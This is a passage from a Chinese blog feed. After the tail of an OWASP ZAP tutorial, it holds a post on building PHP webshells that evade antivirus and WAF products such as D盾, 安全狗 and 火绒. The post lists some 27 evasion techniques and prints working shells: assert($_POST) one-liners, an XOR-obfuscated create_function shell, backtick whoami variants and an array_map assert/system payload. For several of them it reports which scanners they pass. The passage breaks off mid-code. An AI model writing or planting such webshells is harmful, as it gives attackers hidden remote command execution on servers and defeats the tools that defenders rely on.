ZAP基本使用教程(Kali版)_菜单栏"></p><p>之后我们找到Network Settings 点击 Setting进行网络代理的设置</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204171402347.png" alt="OWASP ZAP基本使用教程(Kali版)_测试工具_02"></p><p>点开之后我们设置我们的网络代理，由于zap默认的端口为8080，所以我们将端口设置为8080</p><h3 id="Zap的基本应用"><a href="#Zap的基本应用" class="headerlink" title="Zap的基本应用"></a>Zap的基本应用</h3><p>好的我们已经设置完网络代理啦，现在就可以使用我们的工具啦,如图点击。</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204171404578.png" alt="OWASP ZAP基本使用教程(Kali版)_html_04"></p><p>找个网站 <a href="http://xxxx.com/">http://xxxx.com</a> 进行测试</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204171404628.png" alt="OWASP ZAP基本使用教程(Kali版)_测试工具_05"></p><h3 id="导出报告"><a href="#导出报告" class="headerlink" title="导出报告"></a>导出报告</h3><p>我们扫描完结果后如果想要导出结果的话，就可以在上面的菜单栏上选择Report,里面导出的格式有很多，我推荐使用HTML格式的，因为看起来比较直观。</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204171404273.png" alt="OWASP ZAP基本使用教程(Kali版)_html_03"></p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204171401946.png" alt="OWASP ZAP基本使用教程(Kali版)_菜单栏_06"></p>]]></content>
    
    
    <categories>
      
      <category>linux</category>
      
    </categories>
    
    
    <tags>
      
      <tag>学习笔记</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>phpwebshell从基础到深入变种</title>
    <link href="/phpwebshell%E4%BB%8E%E5%9F%BA%E7%A1%80%E5%88%B0%E6%B7%B1%E5%85%A5%E5%8F%98%E7%A7%8D.html"/>
    <url>/phpwebshell%E4%BB%8E%E5%9F%BA%E7%A1%80%E5%88%B0%E6%B7%B1%E5%85%A5%E5%8F%98%E7%A7%8D.html</url>
    
    <content type="html"><![CDATA[<h1 id="php"><a href="#php" class="headerlink" title="php"></a>php</h1><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">先讲讲什么是大码 小马 小马拉大码 一句话木马<br>C:\Users\<span class="hljs-string">e&#x27;e&#x27;</span>t\Desktop\红队安全开发\免杀马的制作\php\备课<br>先讲讲几个重要的php函数的作用<br>C:\Users\<span class="hljs-string">e&#x27;e&#x27;</span>t\Desktop\红队安全开发\免杀马的制作\php\备课<br>然后讲讲几个shell脚本被杀的病因<br>然后讲讲<span class="hljs-number">22</span>个免杀方法<br>然后讲讲手动免杀之路<br> <span class="hljs-number">1.</span>查病因并进行绕过 <span class="hljs-number">2.</span>根据网上的php免杀码进行拼接 <span class="hljs-number">3.</span>通过对上面<span class="hljs-number">22</span>个免杀方法的拼接 <span class="hljs-number">4.</span>自创 另辟蹊径 找寻独特的函数 或者新的php版本的函数  <br> <span class="hljs-number">5.</span>看到一些大佬的测试文章 但是没有提供木马 自己去写一个<br> <br> 最后讲讲后续<br> <span class="hljs-number">1.</span>讲讲常见webshell特征分析C:\Users\<span class="hljs-string">e&#x27;e&#x27;</span>t\Desktop\红队安全开发\免杀马的制作\php\免杀基础-常见Webshell特征分析.lnk<br> <span class="hljs-number">2.</span>C:\Users\<span class="hljs-string">e&#x27;e&#x27;</span>t\Desktop\红队安全开发\免杀马的制作\php\目录下的几个文章<br></code></pre></td></tr></table></figure><p>位置:C:\Users\e’e’t\Desktop\沙箱\被杀马\php\shell.php</p><p>Shell01.php</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205141747763.png" alt="image-20220514174741468"></p><p>这个特征感觉有两个</p><p>一个是主要的是时间问题，它是一个在野较长的冰蝎码（大概率是这个原因）</p><p>第二个是因为它利用的openssl的AES加密 再加上使用了eval函数，造成查杀？（小概率是这个原因）</p><p>Caidao01.php   C:\Users\e’e’t\Desktop\沙箱\被杀马\php\caidao01.php</p><p> <img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205141748328.png" alt="image-20220514174805295"></p><p>这个码可以过d盾和安全狗。但是不能过火绒</p><p>但是火绒杀毒都不会说出问题在哪</p><p>我们先分析它</p><p>不再使用eval而改用assert。（这是个优点）</p><p>使用了destruct析构函数</p><p>析构函数的作用和构造函数正好相反，析构函数只有在对象被垃圾收集器收集前（即对象从内存中删除之前）才会被自动调用。析构函数允许我们在销毁一个对象之前执行一些特定的操作，例如关闭文件、释放结果集等。</p><p>在 PHP 中有一种垃圾回收机制，当对象不能被访问时就会自动启动垃圾回收机制，收回对象占用的内存空间。而析构函数正是在垃圾回收机制回收对象之前调用的。</p><p>在 PHP 中析构函数并不是很常用，它属于类中可选的一部分，只有需要的时候才在类中声明。</p><p>所以这个函数可能是造成被杀的特征之一</p><p>Call_user_func和序列化和反序列化也是造成的原因之一</p><p>还有就是$_POST[]被完整写出来了，这个原因之一</p><p>然后套用一些最近好用的phpshell的方法</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">//没时间将 只讲方法 让他们去百度<br>\<span class="hljs-number">1.</span> 就是加密解密、进制转换<br><br>\<span class="hljs-number">2.</span> 序列化反序列化<br><br>\<span class="hljs-number">3.</span> 用加密进行加壳<br><br>\<span class="hljs-number">4.</span> 自增、异或、取反<br><br>\<span class="hljs-number">5.</span> 取数组交集<br><br>\<span class="hljs-number">6.</span> 一些函数<br><br>uopz_function()<br><br>uasort()        使用用户自定义的比较函数对数组按键值进行排序<br><br>uksort()       和uasort（）一样，不过在输出的时候会进行每两个对调<br><br>array_uintersect_uassoc()  比较键值返回交集<br><br>array_udiff_assoc()    比较函数返回差集<br><br>array_map       <br><br>\<span class="hljs-number">7.</span> php反射机制获得注释的字符php<br><br>\<span class="hljs-number">8.</span> 回调函数  魔术方法__invoke制作回调函数<br><br>\<span class="hljs-number">9.</span> 缓存写webshell<br><br>\<span class="hljs-number">10.</span> 正则匹配绕过<br><br>\<span class="hljs-number">11.</span> 匿名函数<br><br>\<span class="hljs-number">12.</span> 函数取别名use <span class="hljs-keyword">function</span> \create_function <span class="hljs-keyword">as</span> a;<br><br>\<span class="hljs-number">13.</span> 利用数组转换需要的函数<br><br>\<span class="hljs-number">14.</span> 利用全局变量遍历获取想要全局变量<br><br>\<span class="hljs-number">15.</span> 利用自定义类加载<span class="hljs-built_in">public</span> <span class="hljs-keyword">function</span> payload()<br><br>\<span class="hljs-number">16.</span> https://www.php.net/manual/zh/<span class="hljs-keyword">language</span>.oop5.magic.php魔术方法<br><br>\<span class="hljs-number">17.</span> 远程文件包含GetShell，只要把webshell写入txt文件，远程包含一下就可以getshell<br><br>\<span class="hljs-number">18.</span> 设置环境变量存储关键参数<br><br>\<span class="hljs-number">19.</span> 变量覆盖 extract  parse_str<br><br>\<span class="hljs-number">20.</span> <span class="hljs-keyword">null</span> 拼接 <span class="hljs-string">&#x27;&#x27;</span> 拼接  <span class="hljs-string">&#x27;&#x27;</span> <span class="hljs-keyword">null</span> 拼接<br><br>\<span class="hljs-number">21.</span> 命令函数<span class="hljs-keyword">system</span>,passthru,exec,pcntl_exec,shell_exec,popen,proc_open,``(反单引号),ob_start<br><br>\<span class="hljs-number">22.</span> 代码执行函数 Eval和<span class="hljs-keyword">Assert</span> substr()字符串变形 strtr() 函数转换字符串中特定的字符 函数绕过 把关键词当作参数选递<br><br>\<span class="hljs-number">23.</span> 类的继承机制<br><br>\<span class="hljs-number">24.</span>类型转换打断检测引擎正常执行<br><br>\<span class="hljs-number">25.</span>没死透的正则<br><br>\<span class="hljs-number">26.</span>phpyin<span class="hljs-string">&#x27;y</span><br><span class="hljs-string"></span><br><span class="hljs-string">\27.~(按位取反</span><br></code></pre></td></tr></table></figure><?php assert($_POST[‘a’]); ?><p>这里只用POST是因为POST兼容比较大。</p><p>像蚁剑就只兼容POST</p><p>escapeshellarg为密钥加‘’</p><p>首先我们要确定我们的执行命令函数</p><p>常见的eval和arrest肯定是不行的</p><p>可以使用反引号进行命令执行。但是这种方法需要受害机php关闭安全模式和打开shell_exec()</p><p>然后就是我们webshell中的拼接函数</p><p>选小众的就完事了</p><p>先试试uksort() </p><p>期间每一步操作我都是做一步查杀一下。做一步查杀一下。以防止特征查杀</p><p>当然我觉得没有。更多的是逻辑查杀</p><h2 id="①-通过自增得到关键字，然后定义类，类内函数自调用来进行bypass。"><a href="#①-通过自增得到关键字，然后定义类，类内函数自调用来进行bypass。" class="headerlink" title="①. *通过自增得到关键字，然后定义类，类内函数自调用来进行bypass。*"></a><strong>①.</strong> <em><strong>*通过自增得到关键字，然后定义类，类内函数自调用来进行bypass。*</strong></em></h2><p>这里使用proc_open </p><p>可是proc_open使用较为困难</p><p>因为它是使用建立通道，再建立程序运行的方法。代码较为难写，</p><p>但就是这样，防杀能力更强</p><p>而且发现大部分市面上的webshell都没有使用proc_open这个函数</p><p>只可惜后面查阅发现proc_open这个函数适用于反弹shell</p><p>就没有办法作用于webshell了吗</p><p>我们写看一下proc_open的用法<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205141750589.png" alt="image-20220514175031553"><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205141750805.png" alt="image-20220514175045771"></p><p>这里有个疑惑点。这段代码使用的是直接输入命令ipconfig</p><p>而我们的目的是上传一个webshell，但是在这里的用法看来是主动运行命令。</p><p>这样的话我们确实可以利用这个去执行命令。</p><p>比如执行echo一个webshell到新的php文件。</p><p>但是这样有违我们的初衷。我们要做的是进行webshell的免杀。如果这样嵌套一个新的webshell的话。还需要对webshell进行免杀</p><p>那有没有做成webshell的方法吗？</p><p>暂时没找到方法</p><p>C:\Users\e’e’t\Desktop\沙箱\被杀马\php\1.php</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205141751524.png" alt="image-20220514175105475"></p><p>继续用我们的“22（代码执行函数）”吧</p><p>把上面哪个红框换成arrest或者eval</p><p>过狗还是相当容易的。但是过火绒不行</p><h2 id="①-可以利用php的反射机制，获取注释的内容，然后拼凑出assert，从而动态执行"><a href="#①-可以利用php的反射机制，获取注释的内容，然后拼凑出assert，从而动态执行" class="headerlink" title="①. *可以利用php的反射机制，获取注释的内容，然后拼凑出assert，从而动态执行*"></a><strong>①.</strong> <em><strong>*可以利用php的反射机制，获取注释的内容，然后拼凑出assert，从而动态执行*</strong></em></h2><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205141752088.png" alt="image-20220514175157641">慢慢调试<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205141752469.png" alt="image-20220514175216436"></p><p>接下来就是在_POST前加上$和在其后加上[‘a’]<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205141752970.png" alt="image-20220514175225919"></p><p>接下来就是拼接调用<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205141752750.png" alt="image-20220514175232715"></p><p>参考大佬 用到了@$assret($a&#x3D;$a);  $a&#x3D;$_POST[‘a’]<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205141752852.png" alt="image-20220514175240798"><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205141752499.png" alt="image-20220514175248462"></p><p>火绒过了？</p><p>难以置信<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205141752234.png" alt="image-20220514175258189"></p><p>果然有问题</p><p>&#x3D;&#x3D;不能执行的话就别讲免杀了！！！&#x3D;&#x3D;</p><p>看看问题出现在哪</p><p>我感觉是@$assret($a&#x3D;$a);用不了了</p><p>现在我们可以肯定的是</p><p>$dd &#x3D; assert</p><p>$ee &#x3D; $_POST[‘a’]</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205141753775.png" alt="image-20220514175317743"><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205141753569.png" alt="image-20220514175321511"></p><p>我感觉是因为我在写的时候是没把它实例化出来</p><p>就是说得写个function去执行它</p><p>不然系统会认为它是个文本<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205141753432.png" alt="image-20220514175353403"><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205141753350.png" alt="image-20220514175359311"></p><p>有报错说明是好事</p><p>t_variable是PHP的一种内部标识，通常用在错误信息中。</p><p>出现该错误是因为在不该出现变量的地方出现了变量，或者变量名不合法。</p><p>就是说$dd后不能再加一个变量<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205141754556.png" alt="image-20220514175411525"></p><p>再次访问<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205141754514.png" alt="image-20220514175418482"></p><p>有点问题</p><p>直接改成$_REQUEST[‘x’]试试<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205141754417.png" alt="image-20220514175426386"><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205141754900.png" alt="image-20220514175430862"></p><p>反引号无敌、用反引号试试<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205141754298.png" alt="image-20220514175439263"></p><p>再加个print扰乱一下规则<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205141754438.png" alt="image-20220514175446391"></p><p>&#x3D; &#x3D; &#x3D; &#x3D;&#x3D; &#x3D; &#x3D; &#x3D; &#x3D;&#x3D; &#x3D;&#x3D;  &#x3D;&#x3D;&#x3D; &#x3D; &#x3D; &#x3D; &#x3D;&#x3D; &#x3D;  &#x3D; </p><p>自闭</p><p>是不是我这个方法不对？</p><p>不能$dd和$ee只能用一个？</p><p>网上很多都是只用一个</p><p>那就写一个试试</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205141754282.png" alt="image-20220514175455253"><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205141755311.png" alt="image-20220514175505265"></p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205141755585.png" alt="image-20220514175510842">无语  不搞了  要学会放弃  下一个</p><h2 id="③-静态函数调用普通函数，或者普通函数调用静态函数。-（-冰蝎码启发-）-其他类静态函数"><a href="#③-静态函数调用普通函数，或者普通函数调用静态函数。-（-冰蝎码启发-）-其他类静态函数" class="headerlink" title="*③**静态函数调用普通函数，或者普通函数调用静态函数。**（**冰蝎码启发**）**:其他类静态函数();*"></a><em><strong>*③*</strong></em><em><strong>*静态函数调用普通函数，或者普通函数调用静态函数。*</strong></em><em><strong>*（*</strong></em><em><strong>*冰蝎码启发*</strong></em><em><strong>*）*</strong></em><em><strong>*:其他类静态函数();*</strong></em></h2><h2 id="⑤-我们可不可以把webshell隐藏在多个正常的php文件中形成一个调用链，当然这种形式已经跳出了上传的场景，更加偏向于权限维持。我们也可以将webshell隐藏在php扩展中来绕过一些限制敏感函数执行的场景。其实这个思路已经有很多大佬做过了。也有一些开源的东西。"><a href="#⑤-我们可不可以把webshell隐藏在多个正常的php文件中形成一个调用链，当然这种形式已经跳出了上传的场景，更加偏向于权限维持。我们也可以将webshell隐藏在php扩展中来绕过一些限制敏感函数执行的场景。其实这个思路已经有很多大佬做过了。也有一些开源的东西。" class="headerlink" title="*⑤**我们可不可以把webshell隐藏在多个正常的php文件中形成一个调用链，当然这种形式已经跳出了上传的场景，更加偏向于权限维持。我们也可以将webshell隐藏在php扩展中来绕过一些限制敏感函数执行的场景。其实这个思路已经有很多大佬做过了。也有一些开源的东西。*"></a><em><strong>*⑤*</strong></em><em><strong>*我们可不可以把webshell隐藏在多个正常的php文件中形成一个调用链，当然这种形式已经跳出了上传的场景，更加偏向于权限维持。我们也可以将webshell隐藏在php扩展中来绕过一些限制敏感函数执行的场景。其实这个思路已经有很多大佬做过了。也有一些开源的东西。*</strong></em></h2><h2 id="⑥使用脚本把免杀shell中的函数名，类名，以及变量名进行随机化处理。把敏感函数eval，assert进行异或处理"><a href="#⑥使用脚本把免杀shell中的函数名，类名，以及变量名进行随机化处理。把敏感函数eval，assert进行异或处理" class="headerlink" title="*⑥使用脚本把免杀shell中的函数名，类名，以及变量名进行随机化处理。把敏感函数eval，assert进行异或处理*"></a><em><strong>*⑥使用脚本把免杀shell中的函数名，类名，以及变量名进行随机化处理。把敏感函数eval，assert进行异或处理*</strong></em></h2><p>不建议异或处理。现在大部分异或处理已经很难过杀了</p><h2 id="⑦函数-异或"><a href="#⑦函数-异或" class="headerlink" title="*⑦函数+异或*"></a><em><strong>*⑦函数+异或*</strong></em></h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs java">&lt;?<span class="hljs-type">php</span><br><br><span class="hljs-variable">$num</span> <span class="hljs-operator">=</span> array(<span class="hljs-number">81</span>,<span class="hljs-number">64</span>,<span class="hljs-number">87</span>,<span class="hljs-number">83</span>,<span class="hljs-number">70</span>,<span class="hljs-number">87</span>,<span class="hljs-number">109</span>,<span class="hljs-number">84</span>,<span class="hljs-number">71</span>,<span class="hljs-number">92</span>,<span class="hljs-number">81</span>,<span class="hljs-number">70</span>,<span class="hljs-number">91</span>,<span class="hljs-number">93</span>,<span class="hljs-number">92</span>);<br><br>$xor_key = <span class="hljs-number">50</span>; <span class="hljs-comment">// xor key</span><br><br>foreach ($num <span class="hljs-type">as</span> <span class="hljs-variable">$key</span> <span class="hljs-operator">=</span>&gt; $value) &#123;<br><br>$num[$key] = chr($num[$key] ^ $xor_key);<br><br>&#125;<br><br>$a = implode($num);<br><br><span class="hljs-comment">// create_function组合</span><br><br>function <span class="hljs-title function_">v</span><span class="hljs-params">($param, $a)</span>&#123;<br><br><span class="hljs-keyword">return</span> $a(<span class="hljs-string">&quot;&quot;</span>,$param);<br><br>&#125;<br><br>$param = <span class="hljs-string">&quot;&quot;</span>;<br><br><span class="hljs-comment">// 规避$_POST报毒</span><br><br>foreach ($GLOBALS <span class="hljs-type">as</span> <span class="hljs-variable">$key</span> <span class="hljs-operator">=</span>&gt; $value) &#123;<br><br><span class="hljs-keyword">if</span>($key == <span class="hljs-string">&#x27;_POST&#x27;</span>)&#123;<br><br>$param = $$key;<br><br>$param = $param[<span class="hljs-string">&#x27;x&#x27;</span>];<br><br>&#125;<br><br>&#125;<br><br>$b = v($param, $a);<br><br>$b();<br><br>?&gt;<br></code></pre></td></tr></table></figure><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205141756897.png" alt="image-20220514175633860"><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205141756088.png" alt="image-20220514175641032"><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205141756500.png" alt="image-20220514175649463"></p><p>异或太难了。可以说是即难又很不容易过waf的方法</p><h2 id="⑧利用空格和tab数构造字符"><a href="#⑧利用空格和tab数构造字符" class="headerlink" title="*⑧利用空格和tab数构造字符*"></a><em><strong>*⑧利用空格和tab数构造字符*</strong></em></h2><p>Pro版：如果将空格与 tab 分别用 2 个不同的不可见字符替换</p><p>就是unicode的17B4和17B5，这两个字符大部分不可见</p><p>大佬有些相关的脚本（使用的话必须php文本够长，不够的话脚本会自动填充，造成底部产生很多空格）</p><h2 id="⑨传统的绕过最终都会进行语法解析；-但是如果语法报错的话，就可能导致解析失败了-；-就可以利用这个来执行命令"><a href="#⑨传统的绕过最终都会进行语法解析；-但是如果语法报错的话，就可能导致解析失败了-；-就可以利用这个来执行命令" class="headerlink" title="*⑨传统的绕过最终都会进行语法解析；**但是如果语法报错的话，就可能导致解析失败了**；**就可以利用这个来执行命令*"></a><em><strong>*⑨传统的绕过最终都会进行语法解析；*</strong></em><em><strong>*但是如果语法报错的话，就可能导致解析失败了*</strong></em><em><strong>*；*</strong></em><em><strong>*就可以利用这个来执行命令*</strong></em></h2><p>参考<a href="https://mp.weixin.qq.com/s?__biz=Mzg4NTUwMzM1Ng==&mid=2247494666&idx=1&sn=f13db3c11d65d9867e13f750dc4bbb0a&chksm=cfa54819f8d2c10f56637e9de1119bb43d5f80b688d1195adbf609c2c2797b007040818e6a10&mpshare=1&scene=23&srcid=0307cWYujvf1n0EC7qLoRiWU&sharer_sharetime">………….</a></p><p>先基础的  </p><h3 id="1-利用-特殊符号来引起报错"><a href="#1-利用-特殊符号来引起报错" class="headerlink" title="1.利用\特殊符号来引起报错"></a>1.利用\特殊符号来引起报错</h3><?php\echo `whoami`;?><p>环境php5.2可以执行</p><p>其他的都不行</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205141757427.png" alt="image-20220514175732389"></p><h3 id="2-高版本php语法不换行来执行命令"><a href="#2-高版本php语法不换行来执行命令" class="headerlink" title="2.高版本php语法不换行来执行命令"></a>2.高版本php语法不换行来执行命令</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java">&lt;?=<br><br>$a=&lt;&lt;&lt; aa<br><br>assasssasssasssasssasssasssasssasssasssasssassss<br><br>aa;echo `whoami`<br><br>?&gt;<br></code></pre></td></tr></table></figure><p>适合7.3</p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205141757681.png" alt="image-20220514175751646" style="zoom:150%;" /><ol start="3"><li><h3 id="利用php不同版本十六进制来进行报错"><a href="#利用php不同版本十六进制来进行报错" class="headerlink" title="利用php不同版本十六进制来进行报错"></a>利用php不同版本十六进制来进行报错</h3></li></ol><p>在php7中不认为是数字，php5则依旧为数字<br>经过测试 5.3 和5.5可以成功执行命令，5.2和php7无法执行</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java">&lt;?php<br><br>$s=substr(<span class="hljs-string">&quot;aabbccsystem&quot;</span>,<span class="hljs-string">&quot;0x6&quot;</span>);<br><br>$s(whoami)<br><br>?&gt;<br></code></pre></td></tr></table></figure><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205141758714.png" alt="image-20220514175843672"></p><p>这里我们就用高版本的来<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205141758359.png" alt="image-20220514175852310"></p><p>连接看看<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205141759158.png" alt="image-20220514175902103" style="zoom:150%;" /><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205141759828.png" alt="image-20220514175906786"></p><p>看一下D盾<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205141759443.png" alt="image-20220514175916398" style="zoom:150%;" /></p><p>太直接了</p><p>接下来就是免杀</p><p>我们先用marcr0phag3大佬的字符转空白脚本试一下<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205141759517.png" alt="image-20220514175929481"></p><p>用不了</p><p>这个脚本的payload格式只能是命令执行函数。不难添加其他的</p><p>那我们使用它本来那个payload看下怎么样<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205141759670.png" alt="image-20220514175939627"></p><p>还是报错？？</p><p>那就不搞这个了  尝试别的免杀<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205141759420.png" alt="image-20220514175948368"><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205141759863.png" alt="image-20220514175954812"><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205141800010.png" alt="image-20220514180003972"></p><p>好的变成1了 基本上这个时安全狗都是直接过</p><p>提示我们内藏变量函数$str</p><p>那我们看一下能不能用别的字符去替代$str<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205141800287.png" alt="image-20220514180013243"><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205141800344.png" alt="image-20220514180018291"><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205141800977.png" alt="image-20220514180023934"></p><p>改名字也没用</p><p>这就证明了这个是被逻辑查杀的</p><p>需要用其他方法</p><p>直接用环境变量<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205141800299.png" alt="image-20220514180034259" style="zoom: 150%;" /></p><p>D盾免杀<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205141800599.png" alt="image-20220514180042544" style="zoom:150%;" /><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205141800213.png" alt="image-20220514180050170"><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205141800637.png" alt="image-20220514180056582"></p><p>火绒也过 真爽！</p><p>对于关键词的后传入对免杀安全狗，d盾，河马 等等都是不错的，后期对于菜刀的轮子，也要走向高度的自定义化 用户可以对传出的post数据进行自定义脚本加密，再由webshell进行解密获取参数，那么以现在的软WAF查杀能力 几乎为0</p><h1 id="php后续"><a href="#php后续" class="headerlink" title="php后续"></a>php后续</h1><h2 id="免杀基础-常见Webshell特征分析"><a href="#免杀基础-常见Webshell特征分析" class="headerlink" title="免杀基础-常见Webshell特征分析"></a>免杀基础-常见Webshell特征分析</h2><p>C:\Users\e’e’t\Desktop\红队安全开发\免杀马的制作\php</p><h2 id="冰蝎webshell免杀"><a href="#冰蝎webshell免杀" class="headerlink" title="冰蝎webshell免杀"></a>冰蝎webshell免杀</h2><p>直接拿冰蝎码去除好特征后（直接打开备课的链接）拿到</p><p>C:\Users\e’e’t\Desktop\红队安全开发\免杀马的制作\php\加密网站 全打勾</p><p>不过只有在php7.0的时候可以解析</p><h2 id="分析别人的代码"><a href="#分析别人的代码" class="headerlink" title="分析别人的代码"></a>分析别人的代码</h2><p>1.php</p><p>传入参数c和d，array_map函数作用将<strong>作为函数，array</strong>作为参数，构造paylaod</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">?<span class="hljs-keyword">c</span><span class="hljs-operator">=</span>assert&amp;d<span class="hljs-operator">=</span>system(<span class="hljs-variable">%27</span>ls<span class="hljs-variable">%27</span>)<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><p>2.php   php5.3.3</p><p><strong>create_function</strong> 函数会创建一个匿名函数（<code>lambda</code>样式），在第一个<code>echo</code>中显示出名字，并在第二个<code>echo</code>语句中执行了此函数。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 